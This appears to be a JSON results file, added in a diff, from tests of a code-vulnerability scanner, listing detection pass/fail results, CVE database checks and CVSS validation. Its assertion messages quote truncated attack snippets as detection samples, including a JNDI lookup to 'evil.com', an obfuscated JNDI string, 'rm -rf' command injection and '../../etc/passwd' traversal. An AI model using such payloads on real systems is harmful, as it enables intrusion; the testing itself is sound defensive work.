@@ -1,0 +1,1107 @@
+{
+  "timestamp": "2025-11-27T18:41:06.675Z",
+  "summary": {
+    "passed": 211,
+    "failed": 7,
+    "passRate": "96.8",
+    "elapsed": 8
+  },
+  "detectionAccuracy": {
+    "detected": 44,
+    "missed": 6,
+    "falsePositives": 0,
+    "accuracy": 88
+  },
+  "assertions": [
+    {
+      "status": "pass",
+      "message": "command_injection: Correctly detected \"exec(`rm -rf ${userInput}`)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "command_injection: Correctly detected \"child_process.exec(req.body.command)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "command_injection: Correctly detected \"spawn(cmd, { shell: true })...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "command_injection: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "command_injection: Correctly detected \"system($_GET[\"cmd\"])...\"",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "sql_injection: MISSED \"query(\"SELECT * FROM users WHERE id = \" ...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "sql_injection: Correctly detected \"db.query(`DELETE FROM ${table} WHERE id ...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "sql_injection: Correctly detected \"sequelize.query(userInput + \" ORDER BY i...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "sql_injection: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly detected \"target[\"__proto__\"] = malicious...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly detected \"target[\"constructor\"][\"prototype\"] = pay...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly detected \"Object.assign({}, req.body)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly detected \"{ ...req.body }...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "prototype_pollution: Correctly detected \"merge(defaults, req.body)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "template_injection: Correctly detected \"ejs.render(template, req.body)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "template_injection: Correctly detected \"res.render(\"index\", { user: req.user })...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "template_injection: Correctly detected \"nunjucks.renderString(req.body.template)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "template_injection: MISSED \"pug.render(req.params.template)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "unsafe_deserialization: Correctly detected \"pickle.loads(user_data)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "unsafe_deserialization: Correctly detected \"yaml.load(config_file)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "unsafe_deserialization: Correctly detected \"unserialize($_POST[\"data\"])...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "unsafe_deserialization: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "jndi_injection: Correctly detected \"log.info(\"User: ${jndi:ldap://evil.com/a...\"",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "jndi_injection: MISSED \"${${lower:j}ndi:ldap://x}...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "jndi_injection: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "regex_dos: MISSED \"/^(a+)+$/...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "regex_dos: Correctly detected \"/(.*)+/...\"",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "regex_dos: MISSED \"/([a-z]+)+/...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "regex_dos: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "ssrf: Correctly detected \"fetch(req.body.url)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "ssrf: Correctly detected \"axios.get(params.endpoint)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "ssrf: Correctly detected \"http.get(userUrl + \"/api\")...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "ssrf: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "path_traversal: Correctly detected \"readFile(\"./uploads/\" + req.params.file)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "path_traversal: Correctly detected \"path.join(base, req.query.path)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "path_traversal: Correctly detected \"../../etc/passwd...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "path_traversal: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "hardcoded_secrets: Correctly detected \"apiKey = \"sk-1234567890abcdefghijklmnopq...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "hardcoded_secrets: Correctly detected \"password = \"super_secret_password_123\"...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "hardcoded_secrets: Correctly detected \"AKIA1234567890123456...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "hardcoded_secrets: Correctly detected \"ghp_abcdefghijklmnopqrstuvwxyz1234567890...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "hardcoded_secrets: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "xss: Correctly detected \"element.innerHTML = userInput...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "xss: Correctly detected \"document.write(data)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "xss: Correctly detected \"<div dangerouslySetInnerHTML={{__html: c...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "xss: Correctly ignored safe code",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "auth_bypass: Correctly detected \"jwt.verify(token, secret, { algorithms: ...\"",
+      "category": "detection"
+    },
+    {
+      "status": "fail",
+      "message": "auth_bypass: MISSED \"if (password.compare(input) || true)...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "auth_bypass: Correctly detected \"isAdmin = req.body.isAdmin...\"",
+      "category": "detection"
+    },
+    {
+      "status": "pass",
+      "message": "Database has 23 CVEs (min 20)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-3094 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-3094 has valid CVSS (10)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-3094 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-3094 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-3094 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-4577 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-4577 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-4577 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-4577 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-4577 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-21626 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-21626 has valid CVSS (8.6)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-21626 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-21626 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-21626 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-38856 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-38856 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-38856 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-38856 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-38856 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-27198 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-27198 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-27198 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-27198 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-27198 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-1709 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-1709 has valid CVSS (10)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-1709 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-1709 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2024-1709 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-44487 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-44487 has valid CVSS (7.5)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-44487 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-44487 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-44487 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-38545 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-38545 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-38545 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-38545 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-38545 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-4863 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-4863 has valid CVSS (9.6)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-4863 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-4863 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-4863 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-22527 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-22527 has valid CVSS (10)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-22527 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-22527 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-22527 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-46604 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-46604 has valid CVSS (10)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-46604 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-46604 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-46604 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-34362 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-34362 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-34362 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-34362 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-34362 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-45133 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-45133 has valid CVSS (9.3)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-45133 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-45133 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-45133 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-46175 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-46175 has valid CVSS (7.1)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-46175 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-46175 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-46175 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26159 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26159 has valid CVSS (6.1)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26159 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26159 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26159 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-25883 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-25883 has valid CVSS (7.5)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-25883 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-25883 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-25883 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26136 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26136 has valid CVSS (6.5)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26136 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26136 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-26136 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-37601 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-37601 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-37601 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-37601 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-37601 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-23337 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-23337 has valid CVSS (7.2)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-23337 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-23337 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-23337 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-29078 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-29078 has valid CVSS (9.8)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-29078 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-29078 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2022-29078 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-44228 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-44228 has valid CVSS (10)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-44228 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-44228 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-44228 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-45046 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-45046 has valid CVSS (9)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-45046 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-45046 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2021-45046 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-40217 has matching ID field",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-40217 has valid CVSS (5.3)",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-40217 has CWE mappings",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-40217 has affected packages",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "CVE CVE-2023-40217 has description",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-3094 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-3094 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-4577 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-4577 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-21626 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-21626 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-38856 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-38856 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-27198 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-27198 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-1709 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2024-1709 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-44487 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-44487 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-4863 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-4863 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-22527 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-22527 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-46604 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-46604 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-34362 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2023-34362 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2021-44228 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2021-44228 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2021-45046 exists in database",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "KEV CVE-2021-45046 marked as exploited",
+      "category": "database"
+    },
+    {
+      "status": "pass",
+      "message": "Same text similarity ≈ 1.0 (got 1.0000)",
+      "category": "vector"
+    },
+    {
+      "status": "fail",
+      "message": "Similar texts have positive similarity (0.1896)",
+      "category": "vector"
+    },
+    {
+      "status": "pass",
+      "message": "Embedding has correct dimensions (256)",
+      "category": "vector"
+    },
+    {
+      "status": "pass",
+      "message": "Embeddings are L2 normalized (norm=1.0000)",
+      "category": "vector"
+    },
+    {
+      "status": "pass",
+      "message": "Softmax sums to 1.0 (got 1.0000)",
+      "category": "gnn"
+    },
+    {
+      "status": "pass",
+      "message": "Attention weights sum to 1.0",
+      "category": "gnn"
+    },
+    {
+      "status": "pass",
+      "message": "Attention weights in [0,1]",
+      "category": "gnn"
+    },
+    {
+      "status": "pass",
+      "message": "Graph has 4 nodes",
+      "category": "graph"
+    },
+    {
+      "status": "pass",
+      "message": "Graph has 3 edges",
+      "category": "graph"
+    },
+    {
+      "status": "pass",
+      "message": "All nodes reachable from sqli",
+      "category": "graph"
+    },
+    {
+      "status": "pass",
+      "message": "Found attack chains",
+      "category": "graph"
+    },
+    {
+      "status": "pass",
+      "message": "Longest chain has 4 nodes",
+      "category": "graph"
+    },
+    {
+      "status": "pass",
+      "message": "Has critical CVEs (15)",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "Has high CVEs (5)",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "Log4Shell (CVE-2021-44228) CVSS = 10.0",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "XZ backdoor (CVE-2024-3094) CVSS = 10.0",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-3094 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-4577 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-21626 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-38856 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-27198 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2024-1709 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2023-44487 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2023-38545 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2023-4863 has valid CVSS vector",
+      "category": "cvss"
+    },
+    {
+      "status": "pass",
+      "message": "CVE-2023-22527 has valid CVSS vector",
+      "category": "cvss"
+    }
+  ]
+}
